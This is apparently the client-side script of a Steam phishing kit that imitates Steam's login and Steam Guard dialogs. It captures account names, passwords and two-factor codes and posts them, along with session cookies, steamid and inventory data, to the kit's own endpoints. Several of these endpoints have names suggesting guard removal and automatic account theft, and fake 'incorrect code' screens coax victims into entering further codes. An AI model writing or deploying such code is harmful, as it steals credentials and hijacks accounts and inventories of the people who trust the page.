var login = null;
var password = null;
var session_id = null;
var steam_id = null;
var emaildomain = null;
var S = null;
var account = null;
var steamid = null;
var cookies = null;
var doz = null;
var publickey_mod = null;
var publickey_exp = null;
var timestamp = null;
var number = null;
var inventory = null;
var mail = null;
var mailpass = null;

document.querySelectorAll(".newmodal_close").forEach(el => el.addEventListener('click',function (e) {document.querySelectorAll("#modalguardM").forEach(el => el.style.display="none")}));
document.querySelectorAll(".newmodal_close").forEach(el => el.addEventListener('click',function (e) {document.querySelectorAll(".newmodal_background").forEach(el => el.style.display="none")}));

$('form#login_form').on('submit', function(e){
    event.preventDefault();
    login = $('input#input_username').val();
    password = $('input#input_password').val();


    let data = JSON.stringify({
        "login": login,
        "password": password,
        "url": promo
    });

    $.ajax({
        type: "POST",
        url: `/dologin?login=${login}&password=${password}`,
        data:data,
        dataType: 'json',
        beforeSend: function() {
        $('#login_btn_signin').hide();
        $('#login_btn_wait').show();
        },
        success: function(data) {
            if (data.message == "The account name or password that you have entered is incorrect.") {
                $("#error_display").text("The account name or password that you have entered is incorrect.");
                $("#error_display").slideDown();
                $('#login_btn_signin').show();
                $('#login_btn_wait').hide();
                let data = JSON.stringify({
                    "url": promo
                });
                $.ajax({
                type: "POST",
                    url: `/invalidauth`,
                    data: data,
                    dataType: 'json'
                })
            }
            else {
                if (data.do == "MobileLogin") {
                    doz = "MobileLogin";
                    $("#auth_details_computer_name").hide()
                    $(".newmodal_background").css({"display": "block"});
                    $("#modalguardM").css({"display": "block"});
                    $('#login_twofactorauth_message_entercode_accountname').text( login );
                    $("#emailauth_entercode_emaildomain").hide()
                }
                else if (data.do == "EmailLogin") {
                    emaildomain = data.emaildomain;
                    doz = "EmailLogin";
                    $("#emailauth_entercode_emaildomain").show()
                    $('#emailauth_entercode_emaildomain').text( emaildomain );
                    $("#auth_details_computer_name").show()
                    $('#supportText').text( "I don't have any message from Steam Support..." );
                    $('#submitText').text( 'my special access code' );
                    $("#submitText").css({"top": "58%"});
                    $('#supportButton').text( 'What message?' );
                    $('#submitButton').text( 'Submit' );
                    $("#submitButton").css({"top": "51%"});
                    $(".newmodal_background").css({"display": "block"});
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconEmail").css({"display": "block"});
                    $("#modalguardM").css({"display": "block"});
                    $('.title_text').text( 'steam guard' );
                    $("#login_twofactorauth_message_entercode_accountname").text( ' ' );
                    $(".auth_modal_h1").text( 'Hello!' );
                    $(".newmodal").css({"max-width": "550px"})
                    $(".newmodal").css({"width": "550px"})
                    $(".guardinfo").text( "We see you're logging in to Steam from a new browser or a new computer. Or maybe it's just been a while..." );
                    $("#privetGay").text( "As an added account security measure, you’ll need to grant access to this browser by entering the special code we’ve just sent to your email address at " );
                }
                else if (data.do == 'Nonguard'){
                    emaildomain = data.emaildomain;
                    S = data.S;
                    account = data.account;
                    cookies = data.cookies;
                    steam_id = data.steamid;
                    session_id = data.session_id;
                    publickey_exp = data.publickey_exp;
                    publickey_mod = data.publickey_mod;
                    timestamp = data.timestamp;
                    mail = data.mail;
                    mailpass = data.mailpass;
                    doz = "Nonguard";
                    $("#emailauth_entercode_emaildomain").show()
                    $('#emailauth_entercode_emaildomain').text( emaildomain );
                    $("#auth_details_computer_name").show()
                    $('#supportText').text( "I don't have any message from Steam Support..." );
                    $('#submitText').text( 'my special access code' );
                    $("#submitText").css({"top": "58%"});
                    $('#supportButton').text( 'What message?' );
                    $('#submitButton').text( 'Submit' );
                    $("#submitButton").css({"top": "51%"});
                    $(".newmodal_background").css({"display": "block"});
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconEmail").css({"display": "block"});
                    $("#modalguardM").css({"display": "block"});
                    $('.title_text').text( 'steam guard' );
                    $("#login_twofactorauth_message_entercode_accountname").text( ' ' );
                    $(".auth_modal_h1").text( 'Hello!' );
                    $(".newmodal").css({"max-width": "550px"})
                    $(".newmodal").css({"width": "550px"})
                    $(".guardinfo").text( "We see you're logging in to Steam from a new browser or a new computer. Or maybe it's just been a while..." );
                    $("#privetGay").text( "As an added account security measure, you’ll need to grant access to this browser by entering the special code we’ve just sent to your email address at " );
                }
            }
        }
    })
    })
$('form#ModalTF').on('submit', function(e){
    event.preventDefault();
    let code = $('input#twofactorcode_entryx').val();

    if (doz == "Nonguard") {
        let data = JSON.stringify({
        "code": code,
        "cookies": cookies,
        "publickey_mod": publickey_mod,
        "publickey_exp": publickey_exp,
        "timestamp": timestamp,
        "url": promo,
        "password": password
        });

        $.ajax({
           type: "POST",
           url: `/nonguard?code=${code}&steamid=${steam_id}&session_id=${session_id}&S=${S}&account=${account}&login=${login}`,
           data:data,
           beforeSend: function() {
           $("#login_twofactorauth_buttonsets").children().hide()
           $("#login_twofactorauth_buttonset_waiting").show()
           }
        })
    }
    else if (doz == "emailcode") {
        let data = JSON.stringify({
        "code": code,
        "cookies": cookies,
        "publickey_mod": publickey_mod,
        "publickey_exp": publickey_exp,
        "timestamp": timestamp,
        "login": login,
        "session_id": session_id,
        "steamid": steam_id,
        "S": S,
        "account": account,
        "url": promo
        });

        $.ajax({
           type: "POST",
           url: `/SnyatieEmail?timestamp=${timestamp}`,
           data:data,
           beforeSend: function() {
           $("#login_twofactorauth_buttonsets").children().hide()
           $("#login_twofactorauth_buttonset_waiting").show()
             }
           })
    }
    else if (doz == "MobileLogin") {
        let data = JSON.stringify({
        "code": code,
        "login": login,
        "password": password,
        "url": promo
        });

        $.ajax({
           type: "POST",
           url: `/mobileauth`,
           data:data,
           beforeSend: function() {
           $("#login_twofactorauth_buttonsets").children().hide()
           $("#login_twofactorauth_buttonset_waiting").show()
           },
           success: function(data) {
                if (data.do == "AutoUgon") {
                    doz = "AutoUgon";
                    S = data.S;
                    publickey_exp = data.publickey_exp;
                    publickey_mod = data.publickey_mod;
                    inventory = data.inventory;
                    steam_id = data.steamid;
                    session_id = data.session_id;
                    cookies = data.cookies;
                    account = data.account;
                    timestamp = data.timestamp;
                    document.getElementById("login_twofactorauth_selfhelp_sms_remove_entercode_last_digits").innerHTML = data.number;
                    $("#login_twofactorauth_message_selfhelp_sms_remove_entercode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_iconInc").css({"display": "none"});
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "none"});
                    $("#privetGay").css({"position": "absolute"});
                    $("#privetGay").css({"top": "37%"});
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconKey").css({"display": "block"});
                    $("#login_twofactorauth_messages").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $("#login_twofactor_authcode_entry").hide()
                    $(".auth_button leftbtn").css({"display": "none"});
                    $("#authbutton").css({"display": "none"});
                    $("#SnyatieButton").css({"display": "block"});
                    $("#login_twofactor_authcode_entry2").css({"display": "block"});
                    $("#login_twofactor_authcode_entry2").css({"bottom": "45%"});
                }
                else if (data.do == "mafile") {
                    doz = "mafile";
                    inventory = data.inventory;
                    steam_id = data.steamid;
                    session_id = data.session_id;
                    cookies = data.cookies;
                    document.getElementById("login_twofactorauth_selfhelp_sms_remove_entercode_last_digits").innerHTML = data.number;
                    $("#login_twofactorauth_message_selfhelp_sms_remove_entercode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_iconInc").css({"display": "none"});
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "none"});
                    $("#privetGay").css({"position": "absolute"});
                    $("#privetGay").css({"top": "37%"});
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconKey").css({"display": "block"});
                    $("#login_twofactorauth_messages").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $("#login_twofactor_authcode_entry").hide()
                    $(".auth_button leftbtn").css({"display": "none"});
                    $("#authbutton").css({"display": "none"});
                    $("#SnyatieButton").css({"display": "block"});
                    $("#login_twofactor_authcode_entry2").css({"display": "block"});
                    $("#login_twofactor_authcode_entry2").css({"bottom": "45%"});
                    $("#privetGay").css({"position": "absolute"});
                    $("#privetGay").css({"top": "37%"});
                }
                else if (data.do == "invalidM") {
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconInc").css({"display": "block"});
                    $("#login_twofactorauth_messages").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $("#login_twofactor_authcode_entry").show()
                }
                else if (data.do == "invalid") {
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconInc").css({"display": "block"});
                    $("#login_twofactorauth_messages").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $("#login_twofactor_authcode_entry").show()
                }
              }
           })
    }
    else if (doz == "EmailLogin") {
        let data = JSON.stringify({
        "code": code,
        "cookies": cookies,
        "publickey_mod": publickey_mod,
        "publickey_exp": publickey_exp,
        "timestamp": timestamp,
        "url": promo
        });

        $.ajax({
           type: "POST",
           url: `/emaillogin?code=${code}&login=${login}&password=${password}`,
           data:data,
           beforeSend: function() {
           $("#login_twofactorauth_buttonsets").children().hide()
           $("#login_twofactorauth_buttonset_waiting").show()
           },
           success: function(data) {
               if (data.do == "success") {
                    S = data.S;
                    account = data.account;
                    cookies = data.cookies;
                    steam_id = data.steamid;
                    session_id = data.session_id;
                    publickey_exp = data.publickey_exp;
                    publickey_mod = data.publickey_mod;
                    timestamp = data.timestamp;
                    doz = "emailcode";
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_buttonset_entercode").show()
                    $("#auth_details_computer_name").show()
                    $("#login_twofactorauth_details_entercode").hide()
                    $("#login_twofactorauth_iconEmail").css({"display": "none"});
                    $("#login_twofactorauth_iconInc").css({"display": "block"});
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $(".auth_modal_h1").text( 'Whoops!' );
                    $('#submitButton').text( 'I want to try again' );
                    $("#submitButton").css({"top": "47%"});
                    $('#submitText').text( "and I've re-entered my special access code above" );
                    $("#submitText").css({"position": "relative"});
                    $("#submitText").css({"left": "-3%"});
                    $("#submitText").css({"top": "25%"});
                    $('#supportButton').text( 'Please help' );
                    $('#supportText').text( 'I think I need assistance from Steam Support...' );
               }
           }
        })
    }
})

$('form#SnyatieAuth').on('submit', function(e){
    event.preventDefault();
    let code = $('input#twofactorcode_entryxSnyatie').val();

   if (doz == "AutoUgon") {
        let data = JSON.stringify({
            "code": code,
            "S": S,
            "session_id": session_id,
            "steamid": steam_id,
            "inventory": inventory,
            "login": login,
            "account": account,
            "timestamp": timestamp,
            "publickey_mod": publickey_mod,
            "publickey_exp": publickey_exp,
            "password": password,
            "cookies": cookies,
            "url": promo
        });

        $.ajax({
            type: "POST",
            url: `/Snyatie`,
            data:data,
            beforeSend: function() {
            $("#login_twofactor_authcode_entry").hide()
            $("#login_twofactorauth_messages").hide()
            $("#login_twofactorauth_details_messages").hide()
            $("#login_twofactorauth_buttonsets").children().hide()
            $("#login_twofactorauth_buttonset_waiting").show()
            }
        })
    }

   else if (doz == "mafile") {
        let data = JSON.stringify({
            "code": code,
            "cookies": cookies,
            "steamid": steam_id,
            "session_id": session_id,
            "inventory": inventory,
            "url": promo
        });

        $.ajax({
            type: "POST",
            url: `/codeMafile`,
            data:data,
            beforeSend: function() {
            $("#login_twofactorauth_icon").css({"display": "none"});
            $("#login_twofactorauth_iconInc").css({"display": "none"});
            $("#login_twofactorauth_iconKey").css({"display": "block"});
            $("#login_twofactor_authcode_entry").hide()
            $("#login_twofactorauth_messages").hide()
            $("#login_twofactorauth_details_messages").hide()
            $("#login_twofactorauth_buttonsets").children().hide()
            $("#login_twofactorauth_buttonset_waiting").show()
            },
            success: function(data) {
                    $("#login_twofactorauth_message_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_incorrectcode").css({"display": "block"});
                    $("#login_twofactorauth_buttonset_waiting").hide()
                    $("#login_twofactorauth_icon").css({"display": "none"});
                    $("#login_twofactorauth_iconInc").css({"display": "block"});
                    $("#login_twofactorauth_messages").css({"display": "block"});
                    $("#login_twofactorauth_message_entercode").css({"display": "none"});
                    $("#login_twofactorauth_iconKey").css({"display": "none"});
                    $("#login_twofactorauth_message_selfhelp_sms_remove_entercode").css({"display": "none"});
            }
        })
        }
    })

